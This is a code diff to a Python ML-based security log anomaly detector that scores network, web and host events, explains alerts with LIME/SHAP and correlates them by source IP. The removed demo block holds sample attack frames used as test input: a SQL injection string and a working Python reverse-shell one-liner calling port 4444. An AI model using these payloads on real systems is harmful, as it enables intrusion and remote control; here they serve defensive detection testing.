@@ -23,83 +23,78 @@ class AssetLoader:
     def fetch(self, tag):
         reg_tag = "HOST_LIN" if tag == "HOST_LINUX" else tag
         reg_tag = "HOST_WIN" if tag == "HOST_WINDOWS" else reg_tag
-
+        
+        if reg_tag not in self.registry:
+            return None, None
+        
         if reg_tag not in self.cache_mdl:
-            cfg = self.registry.get(reg_tag)
-            if not cfg: return None, None
+            mdl_path = os.path.join(self.base, self.registry[reg_tag]["mdl"])
+            vec_path = os.path.join(self.base, self.registry[reg_tag]["vec"]) if self.registry[reg_tag]["vec"] else None
             
-            path_mdl = os.path.join(self.base, cfg["mdl"])
-            path_vec = os.path.join(self.base, cfg["vec"]) if cfg["vec"] else None
-            
-            if not os.path.exists(path_mdl):
-                print(f"[ERROR] Missing artifact: {path_mdl}")
-                return None, None
-            
-            print(f"[LOADER] Booting {reg_tag} specialist...")
-            self.cache_mdl[reg_tag] = joblib.load(path_mdl)
-            self.cache_vec[reg_tag] = joblib.load(path_vec) if path_vec else None
-            
-        return self.cache_mdl[reg_tag], self.cache_vec[reg_tag]
+            if os.path.exists(mdl_path):
+                self.cache_mdl[reg_tag] = joblib.load(mdl_path)
+            else:
+                self.cache_mdl[reg_tag] = None
+                
+            if vec_path and os.path.exists(vec_path):
+                self.cache_vec[reg_tag] = joblib.load(vec_path)
+            else:
+                self.cache_vec[reg_tag] = None
+
+        return self.cache_mdl[reg_tag], self.cache_vec.get(reg_tag)
 
 class ChakshuFusion:
     def __init__(self):
         self.loader = AssetLoader()
-        self.explainer = LimeTextExplainer(class_names=['Anomaly', 'Normal'], split_expression=r'\s+')
         self.history = []
         self.win_size = 60
+        
         self.weights = {
             "L3_L4": 1, "WEB_APP": 2, 
             "AUTH_LINUX": 3, "AUTH_WINDOWS": 3, 
             "HOST_LIN": 3, "HOST_WIN": 3
         }
         
-        # TUNING: The Noise Floor
-        self.whitelist = [
-            "user news", "user cyrus", "cupsd shutdown", "session closed", "ALERT exited",
-            "jk2_init", "mod_jk",
-            "Unrecognized packageExtended", "SQM:", "TrustedInstaller", "Session:", "cached package applicability"
-        ]
-
-    def extract_ip(self, payload, default_ip):
-        # If the parser gave us a real IP, use it
-        if default_ip != "0.0.0.0" and default_ip != "":
-            return default_ip
-            
-        # Regex 1: Standard IPv4 (e.g., 82.252.162.81)
-        match_std = re.search(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', payload)
-        if match_std: return match_std.group(0)
-        
-        # Regex 2: Hyphenated hostnames (e.g., rhost=220-135-151-1)
-        match_hyphen = re.search(r'rhost=([0-9]{1,3}(?:-[0-9]{1,3}){3})', payload)
-        if match_hyphen: return match_hyphen.group(1).replace('-', '.')
-        
-        return default_ip
-
-    def check_os(self, payload):
-        win_sig = ["C:\\", ".exe", ".dll", "EventID", "Microsoft"]
-        lin_sig = ["/var/log", "systemd", "pam_unix", "sshd", "root", "/tmp", "authentication failure"]
-        if any(s in payload for s in win_sig): return "HOST_WIN"
-        if any(s in payload for s in lin_sig): return "HOST_LIN"
-        return None
+        self.explainer = LimeTextExplainer(class_names=['Anomaly', 'Normal'], split_expression=r'\s+')
+        self.whitelist = ["background_radiation", "healthcheck"]
+        self.ip_pattern = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')
 
     def get_proba_fn(self, mdl, vec):
         def predict_proba(texts):
-            x = vec.transform(texts)
-            dist = mdl.decision_function(x)
-            prob_norm = 1 / (1 + np.exp(-dist))
-            return np.vstack([1 - prob_norm, prob_norm]).T
+            X_vec = vec.transform(texts)
+            distances = mdl.decision_function(X_vec)
+            prob_normal = 1 / (1 + np.exp(-distances))
+            prob_anomaly = 1 - prob_normal
+            return np.vstack([prob_anomaly, prob_normal]).T
         return predict_proba
 
+    def check_os(self, payload):
+        payload_lower = payload.lower()
+        if any(x in payload_lower for x in ['c:\\', 'windows', 'cmd.exe']):
+            return "HOST_WIN"
+        if any(x in payload_lower for x in ['/bin/', 'linux', 'bash']):
+            return "HOST_LIN"
+        return None
+
+    def extract_ip(self, payload, default_ip="0.0.0.0"):
+        match = self.ip_pattern.search(payload)
+        if match:
+            return match.group(0)
+        
+        comp_match = re.search(r'(Comp[0-9]{6})', payload)
+        if comp_match:
+            return comp_match.group(1)
+            
+        return default_ip
+
     def process_frame(self, log):
-        payload = log.get("payload", "")
+        payload = str(log.get("payload", ""))
         tag = log.get("act", "L3_L4")
         ts_raw = log.get("ts", datetime.now().isoformat())
         
-        # FIX 1: Noise Filter Check
         if any(w in payload for w in self.whitelist):
             return None
 
-        # FIX 2: Dynamic IP Extraction
         src_ip = self.extract_ip(payload, log.get("src_ip", "0.0.0.0"))
         
         try:
@@ -114,31 +109,51 @@ class ChakshuFusion:
         mdl, vec = self.loader.fetch(tag)
         if not mdl: return None
 
+        forensics = []
+        base_score = 0.0
+        
         if tag == "L3_L4":
-            cols = ['dst_pt', 'b_in', 'b_out']
-            vals = [log.get("dst_pt", 0), log.get("b_in", 0), log.get("b_out", 0)]
-            x_df = pd.DataFrame([vals], columns=cols)
+            feature_cols = ['dst_pt', 'b_in', 'b_out']
+            feature_vals = [int(log.get("dst_pt", 0)), int(log.get("b_in", 0)), int(log.get("b_out", 0))]
+            x_df = pd.DataFrame([feature_vals], columns=feature_cols)
+            
             pred = mdl.predict(x_df)[0]
             base_score = 1.0 if pred == -1 else 0.0
+            
+            if base_score > 0.5:
+                shap_path = os.path.join(self.loader.base, "network_flow", "shap_explainer_v1.pkl")
+                if os.path.exists(shap_path):
+                    try:
+                        explainer = joblib.load(shap_path)
+                        shap_vals = explainer.shap_values(x_df)
+                        for idx, col in enumerate(feature_cols):
+                            shap_score = shap_vals[0][idx]
+                            if shap_score < -0.5:
+                                forensics.append(f"{col}: {feature_vals[idx]} (SHAP: {shap_score:.2f})")
+                        if not forensics:
+                            forensics = ["High-Entropy Volumetric Flow Detected"]
+                    except Exception as e:
+                        forensics = [f"Structural Anomaly (SHAP Error: {str(e)})"]
+                else:
+                    forensics = ["Structural Anomaly (Explainer Not Found)"]
+                    
         else:
             x_vec = vec.transform([payload])
             pred = mdl.predict(x_vec)[0]
             base_score = 1.0 if pred == -1 else 0.0
-
-        forensics = []
-        if base_score > 0.5 and vec:
-            try:
-                fn = self.get_proba_fn(mdl, vec)
-                exp = self.explainer.explain_instance(payload, fn, labels=(0,), num_features=5, num_samples=1000)
-                forensics = [str(text) for text, weight in exp.as_list(label=0) if weight > 0]
-            except:
-                forensics = ["Structural Anomaly (XAI Timeout)"]
+            
+            if base_score > 0.5 and vec:
+                try:
+                    fn = self.get_proba_fn(mdl, vec)
+                    exp = self.explainer.explain_instance(payload, fn, labels=(0,), num_features=5, num_samples=1000)
+                    forensics = [str(text) for text, weight in exp.as_list(label=0) if weight > 0]
+                except:
+                    forensics = ["Structural Anomaly (XAI Timeout)"]
 
         bonus = 0.0
         cutoff = ts - timedelta(seconds=self.win_size)
         self.history = [h for h in self.history if h["ts"] > cutoff]
         
-        # Only apply correlation bonus if we have a valid, non-zero IP
         if src_ip != "0.0.0.0":
             for prev in self.history:
                 if prev["src_ip"] == src_ip and prev["tag"] != tag:
@@ -162,20 +177,3 @@ class ChakshuFusion:
             self.history.append(alert)
         
         return alert
-
-if __name__ == "__main__":
-    engine = ChakshuFusion()
-    
-    stream = [
-        {"act": "L3_L4", "src_ip": "10.0.0.5", "dst_pt": 6667, "b_in": 9999, "b_out": 9999},
-        {"act": "WEB_APP", "src_ip": "10.0.0.5", "payload": "GET /admin?user=' OR '1'='1' HTTP/1.1"},
-        {"act": "HOST_LINUX", "src_ip": "10.0.0.5", "payload": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"}
-    ]
-
-    print("--- Chakshu Fusion Stream Active ---\n")
-    for frame in stream:
-        res = engine.process_frame(frame)
-        if res and res["is_anomaly"]:
-            print(f"[{res['ts'].strftime('%H:%M:%S')}] {res['tag']} | Score: {res['score']} | IP: {res['src_ip']}")
-            print(f" > Evidence: {res['forensics']}")
-            print(f" > Snippet: {res['payload']}\n")
